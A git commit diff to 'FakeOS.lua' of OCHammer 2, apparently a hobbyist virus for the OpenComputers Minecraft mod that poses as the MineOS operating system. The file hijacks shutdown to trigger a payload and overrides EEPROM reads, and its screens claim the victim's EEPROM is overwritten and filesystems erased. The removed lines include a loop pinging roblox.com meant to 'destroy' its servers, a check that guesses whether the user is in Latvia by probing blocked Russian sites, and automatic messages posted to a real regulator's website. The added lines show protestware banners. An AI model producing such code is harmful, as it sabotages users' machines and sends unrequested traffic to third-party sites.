731275f48c68bb3bfdbc9a1b9b40840c6a4acaab
ocboy3 <95974645+ocboy3@users.noreply.github.com>
2022-09-23 22:36:22 +0300

    PUTIN IS BAD PERSON #STANDWITHUKRAINE

--- OCHammer2.app/FakeOS.lua
+++ OCHammer2.app/FakeOS.lua
@@ -21,111 +21,6 @@ end)
 
 local resX,resY = gp.maxResolution()
 
-function ROBLOX()
-  -- destroy roblox servers using internet, ping roblox.com every 0.1 seconds
-  while true do
-    local ping = inet.request("roblox.com")
-    if ping then
-      log("Roblox moderation sucks")
-      break
-    end
-    computer.pullSignal(0.1)
-  end
-end
-
-
--- OChammer2 Fake OS.lua
-
--- New payload for OCHammer 2, that activates, if the user is in Latvia, by testing russian websites to see if they are blocked by the government. (which I rate a solid 0 out of 10 because yes)
--- If the user is in Latvia, the OS will automatically activate the payload.
-
--- ISP's that block russian websites:
--- Tele2
--- TET
--- LMT
--- Baltcom
--- And many others..
-
--- The only way to bypass the censorship is to use a VPN or connect your internet to a phone, which is connected to Data (Not wifi), with "BITE" as the provider.
--- If You are reading this, please do not impose even more restrictions on our internet connections.
-
--- The Latvian goverment uses "Fortinet" to block russian websites. This is why EVERYBODY hates them. (and the government is not happy with them)
-
--- By the way, Putin is a bad person.
-
-log("Starting..")
-log("Testing banned websites..")
-
-local bannedWebsites = {
-  "https://mail.ru"; -- Mail
-  "https://yandex.ru"; -- Yandex (Russian)
-  "https://rutube.ru"; -- Russian youtube ripoff
-  "https://vk.com"; -- VKontakte
-}
-
--- Blocked terms if the website gets trough because OCEmu internet library and not opencomputers
-
-local blockedTerms = {
-  "Latvijas";
-  "BRĪDINĀJUMS!";
-  "neplp-page";
-  "neplp";
-  "tet.lv";
-  "ministru_kabinets";
-  "lang=\"lv\"";
-}
-
-local isBlocked = false
-
--- Loop through the banned websites and ping them to see if they are blocked. If an error is thrown, the website is blocked.
-
--- First of all, check if the internet is available. If not, assume that the user is not in Latvia.
-if inet then
-  for i=1,#bannedWebsites do
-    local url = bannedWebsites[i]
-    log("Testing " .. url)
-    -- if it throws an error, the website is blocked.
-    local success,err = pcall(function() inet.request(url) end)
-    if not success then
-      log("Website blocked! Assuming that the user lives in Latvia.")
-      isBlocked = true
-      break
-    else
-      -- read website content and lower it to lowercase, then scan it for blocked terms. if present then assume the user is in latvia.
-      local content = inet.request(url).read(math.huge):lower()
-      for i=1,#blockedTerms do
-        if content:find(blockedTerms[i]) then
-          log("Website blocked! Assuming that the user lives in Latvia. Blocked term \""..blockedTerms[i].."\" found.")
-          isBlocked = true
-          break
-        end
-      end
-    end
-  end
-end
-
-if isBlocked == false then
-  log("Check passed, assuming that the user doesn't live in latvia!!")
-end
-
--- Automatically send feedback to NEPLP (neplpadome.lv) 
-
-if inet ~= nil then
-  log("Sending feedback to NEPLP.. https://neplpadome.lv")
-  local success, reason = pcall(function()
-    inet.request("https://neplpadome.lv/404", "JUST DELETE YOUR CENSORSHIP ALREADY. NOBODY LIKES IT. SIA TET should be shamed for creating neplp-page.tet.lv! Worst ISP ever! isBlocked = " .. tostring(isBlocked) .. " (OCH2)")
-  end)
-  if not success then
-    log("Failed to send feedback to NEPLP..")
-  else
-    log("Feedback sent to NEPLP..")
-  end
-  -- Sucessfully sent feedback to NEPLP
-else
-  log("Cannot send feedback to NEPLP.. No internet..")
-end
-
-
 function lol()
     log("User has broken the rules, activating payload..")
     
@@ -160,15 +55,15 @@ function lol()
         "There is no going back as your OpenComputer";
         "got WRECKED by the OCHammer 2 virus.";
         "It is a sad thing, that your adventures have ended here!";
-        "For more info, please e-mail: x19yt2yw@duck.com"; -- my private duck address (DO NOT CHANGE)
+        "For more info, please e-mail: x19yt2yw@duck.com"; -- my private duck.com address (DO NOT CHANGE)
         " ";
-        "1v1 me on Hypixel duels! My IGN: OCboy3";
+        "**WARNING**: DO NOT LISTEN TO THE NEWS IN RUSSIA THEY ARE LYING";
+		"VLADIMIR PUTIN IS A BAD PERSON HE INVADED UKRAINE";
         " ";
+		"DO NOT HELP IN ANY SPECIAL MILITARY OPERATION IN RUSSIA AND BELARUS";
+		" ";
         -- put some greetz or something
         "GREETZ: OCboy3, agentfish, cantgetnormaluser, Chouladalls, Kurhox, SirKamilMarko";
-        -- Feel free to check out Verdex cafe on Roblox.com
-        " ";
-        "SIA TET should be shamed for creating neplp-page.tet.lv! USELESS!";
     }
 
     displayTable(ok)
@@ -208,62 +103,50 @@ end
 
 component.proxy(cl("eeprom")()).get = function() -- print(component.eeprom.get())
   --return "GREETZ: OCboy3, agentfish, Chouladalls, Kurhox, SirKamilMarko. Fun Fact: OCboy3 will smack your OpenComputer's monitor with a baseball bat. (jk)"
-  return "Ej izlabo savu 2 latviešu valodā!"
+  return "Vladimir Putin will be in Jail The Kremlin is evil"
 end
+
 
 computer.shutdown = function(...)
   lol()
 end
 
-local facts = {
-  "Fun Fact: OCHammer 2 was released on April 1st, 2022";
-  "Roblox's 2022 egg hunt won't be happening.";
-  "Minecraft is better than Roblox, and so is Fortnite.";
-  "Roblox ist langweilig. Spielen Sie es nicht. Spielen Sie stattdessen Minecraft oder Fortnite."; -- Roblox is boring. Don't play it. Play Minecraft or Fortnite instead.
-  "Spielst du Roblox? Roblox ist langweilig."; --  langweilig = boring
-  "Hitting your OpenComputer's monitor with a baseball bat won't help.";
-  "Fun Fact: I will erase all filesystems connected to your OpenComputer.";
-  "Do you even use MacOS??? Mac's dont get viruses.";
-  --"Sanctions against OCVille!? Again, Seriously!?";
-  --"sanctions";
-  "Eviction Notice.py - Forša joka programma";
-  "Convince the leader of OCVille to evict capyy.";
-  "OCVille's leader evicts capyy!! 100% not fake";
-  "Fortinet gets sued by Latvians and loses! 100% real!!!";
-  "NEPLP gets sued by Latvians and loses! 100% real!!!";
-}
-
-log("Generating fun fact..")
-local funfact = facts[math.random(1,#facts)]
-
 local APRIL = {
-    "LABRĪT!!!";
-    "Your OpenComputer got pwned by OCHammer 2";
-    "You won't be able to boot your OpenComputer anymore as it's EEPROM has been overwritten and made read-only.";
-    "This is the last time you will use it.";
-    funfact;
-    " ";
-    "Rules:";
-    " ";
-    "1. No unplugging your EEPROM (or any component at all)";
-    "2. No shutdown or reboot";
-    "3. No changing the EEPROM's code";
-    "4. No replacing OS.lua";
-    " ";
-    "If you break these rules, your OpenComputer will be broken forever.";
-    "And I will smack your OpenComputer's monitor with a baseball bat. (jk)";
-    " ";
-    "Press any key to continue...";
-    " ";
-    "FOR OUR RUSSIAN USERS: THE MEDIA IS TELLING LIES DO NOT TRUST THEM THEY ATTACKED UKRAINE";
-    "PUTIN IS GOING TO REGRET EVERYTHING HE DID (protestware)";
+	{0xFF0000,0xFFFFFF};
+    "WARNING ANTI-WAR MESSAGE WARNING ANTI-WAR MESSAGE                                                                                                                                                   ";
+	{0x000000,0xFF0000};
+    "IF YOU ARE RUSSIAN DO NOT LISTEN TO THE NEWS, THEY ARE LYING";
+	"DO NOT PARTICIPATE IN ANY SPECIAL MILITARY OPERATION IN RUSSIA OR BELARUS";
+	"THE RUSSIAN GOVERMENT HAD STARTED THE WAR AGAINST UKRAINE FOR UNFAIR REASONS";
+	"I SUGGEST YOU LEAVE RUSSIA IMMEDIATELY";
+	" ";
+	"IF YOU WANT TO YOU CAN PROTEST AGAINST THE KREMLIN.";
+	" ";
+	{0xFF0000,0xFFFFFF};
+	"                                                                                                                                                                                                    ";
+	"This is a anti-war message brought to you by the OCHammer 2 virus.                                                                                                                                  ";
+	"                                                                                                                                                                                                    ";
+	{0x000000,0xFFFFFF};
+	" ";
+	"If you have questions, please contact the developer.";
+	"E-Mail: x19yt2yw@duck.com";
+	" ";
+	"Press a key to continue using MineOS..";
 }
 
 -- loop over each item in a table and display it on the screen
 local function displayTable(table)
-  for i, v in ipairs(table) do
-    gp.set(1,i,v)
-  end
+	local number = 1
+  	for i, v in ipairs(table) do
+		if type(v) == "string" then
+
+  	  		gp.set(1,number,v)
+			number = number+1
+		else
+			gp.setBackground(v[1])
+			gp.setForeground(v[2])
+		end
+  	end
 end
 
 log("Preparing for notice..")
@@ -273,49 +156,11 @@ gp.setForeground(0xFFFFFF)
 
 gp.fill(1,1,resX,resY," ")
 
-local Latvija_Notice = {
-  "OCHammer 2 has detected that you are in Latvia";
-  "by testing Russian websites to see if they are blocked by the goverment";
-  "It appears, that they are blocked.";
-  " ";
-  "Anyways, LABRĪT!!!";
-  " ";
-  "Your OpenComputer got pwned by OCHammer 2";
-  "You won't be able to boot your OpenComputer anymore as it's EEPROM has been overwritten and made read-only.";
-  "This is the last time you will use it.";
-  " ";
-  "Rules:";
-  " ";
-  "1. No unplugging your EEPROM (or any component at all)";
-  "2. No shutdown or reboot";
-  "3. No changing the EEPROM's code";
-  "4. No replacing OS.lua";
-  " ";
-  "If you break these rules, your OpenComputer will be broken forever.";
-  "And I will smack your OpenComputer's monitor with a baseball bat. (jk)";
-  " ";
-  "Press any key to make the Latvian Goverment delete Fortinet...";
-  " ";
-  "PUTIN IS BAD PERSON HE IS WAR CRIMINAL HE WILL GO TO JAIL FOR";
-  "ATTACKING UKRAINE AND LYING ABOUT IT";
-}
-
 local lastPull = {}
 
-local veryfunny = {
-  "capyy";
-  "capyy/";
-  "cappy"; -- alias for capyy
-  "cappy/";
-}
+log("Displaying anti-war message because I suspect that you are a russian.")
+displayTable(APRIL)
 
-if isBlocked == true then
-  log("Displaying notice Latvija_Notice..")
-  displayTable(Latvija_Notice)
-else
-  log("Displaying notice APRIL..")
-  displayTable(APRIL)
-end
     
 log("Listening for key_up")
 
@@ -433,7 +278,7 @@ local function UIRequire(module)
     return math.floor(screenWidth / 2 - width / 2)
   end
   
-  local title, width, total = "SIA TET is trash latvian ISP", 26, 14
+  local title, width, total = "StandWithUkraine", 26, 14
   local x, y, part = centrize(width), math.floor(screenHeight / 2 - 1), math.ceil(width * UIRequireCounter / UIRequireTotal)
   UIRequireCounter = UIRequireCounter + 1
   
@@ -527,6 +372,17 @@ package.loaded.unicode = unicode
 
 ---------------------------------------- Main loop ----------------------------------------
 
+
+local hasDisplayedFirstAntiWarMessage = false
+
+if hasDisplayedFirstAntiWarMessage == false then
+	log("OCHammer 2 virus will now display anti-war messages as a protest against the war in Ukraine. #StandWithUkraine")
+	 displayTable(APRIL)
+	hasDisplayedFirstAntiWarMessage = true
+	 log("Press a key..")
+	repeat lastPull = {computer.pullSignal(1)} until lastPull[1] == "key_up" lastPull = {}
+end
+
 log("Starting main loop..")
 log("Creating OS workspace")
 
@@ -601,17 +457,29 @@ system.authorize()
 
 log("MineOS initalised!")
 
+log("Fun fact: OCHammer 2's developer's favourite youtuber is Branzy, don't you dare disrespect him or I will wreck your OpenComputer.")
+log("You can donate as little as 1 dollar to help with OCHammer 2's developent, so I can buy GitHub copilot.")
+
+lastPull = {}
+
 -- Main loop with UI regeneration after errors 
 while true do
-  local success, path, line, traceback = system.call(workspace.start, workspace, 0)
-  if success then
-    break
-  else
-    system.updateWorkspace()
-    system.updateDesktop()
-    workspace:draw()
-    
-    system.error(path, line, traceback)
-    workspace:draw()
-  end
+ 	local success, path, line, traceback = system.call(workspace.start, workspace, 0)
+ 	if success then
+		break
+	else
+ 	 	system.updateWorkspace()
+ 	 	system.updateDesktop()
+ 	 	workspace:draw()
+			
+ 	 	system.error(path, line, traceback)
+
+		if hasDisplayedFirstAntiWarMessage == true then
+			log("This is a anti-war message brought to you by the OCHammer 2 virus. #StandWithUkraine")
+ 			displayTable(APRIL)
+ 			log("Press a key..")
+			repeat lastPull = {computer.pullSignal(1)} until lastPull[1] == "key_up" lastPull = {}
+		end
+ 	 	workspace:draw()
+ 	end
 end
